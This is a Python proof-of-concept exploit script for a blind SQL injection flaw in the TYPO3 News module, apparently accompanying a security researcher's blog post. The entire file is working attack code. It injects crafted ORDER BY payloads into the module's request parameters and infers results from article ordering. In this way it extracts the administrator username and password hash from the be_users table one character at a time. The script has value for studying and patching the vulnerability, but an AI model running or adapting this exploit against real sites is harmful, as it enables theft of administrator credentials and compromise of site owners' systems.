#!/usr/bin/python3
# TYPO3 News Module SQL Injection Exploit
# https://www.ambionics.io/blog/typo3-news-module-sqli
# cf
#
# The injection algorithm is not optimized, this is just meant to be a POC.
#

import requests
import string


session = requests.Session()
session.proxies = {'http': 'localhost:8080'}

# Change this :-)
URL = 'http://vmweb/typo3/index.php?id=8&no_cache=1'
PATTERN0 = 'Article #1'
PATTERN1 = 'Article #2'


FULL_CHARSET = string.ascii_letters + string.digits + '$./'


def blind(field, table, condition, charset):
    # We add 9 so that the result has two digits
    # If the length is superior to 100-9 it won't work
    size = blind_size(
        'length(%s)+9' % field, table, condition,
        2, string.digits
    )
    size = int(size) - 9
    data = blind_size(
        field, table, condition,
        size, charset
    )
    return data

def select_position(field, table, condition, position, char):
    payload = 'select(%s)from(%s)where(%s)' % (
        field, table, condition
    )
    payload = 'ord(substring((%s)from(%d)for(1)))' % (payload, position)
    payload = 'uid*(case((%s)=%d)when(1)then(1)else(-1)end)' % (
        payload, ord(char)
    )
    return payload

def blind_size(field, table, condition, size, charset):
    string = ''
    for position in range(size):
        for char in charset:
            payload = select_position(field, table, condition, position+1, char)
            if test(payload):
                string += char
                print(string)
                break
        else:
            raise ValueError('Char was not found')

    return string

def test(payload):
    response = session.post(
        URL,
        data=data(payload)
    )
    response = response.text
    return response.index(PATTERN0) < response.index(PATTERN1)

def data(payload):
    return {
        'tx_news_pi1[overwriteDemand][order]': payload,
        'tx_news_pi1[overwriteDemand][OrderByAllowed]': payload,
        'tx_news_pi1[search][subject]': '',
        'tx_news_pi1[search][minimumDate]': '2016-01-01',
        'tx_news_pi1[search][maximumDate]': '2016-12-31',
    }

# Exploit

print("USERNAME:", blind('username', 'be_users', 'uid=1', string.ascii_letters))
print("PASSWORD:", blind('password', 'be_users', 'uid=1', FULL_CHARSET))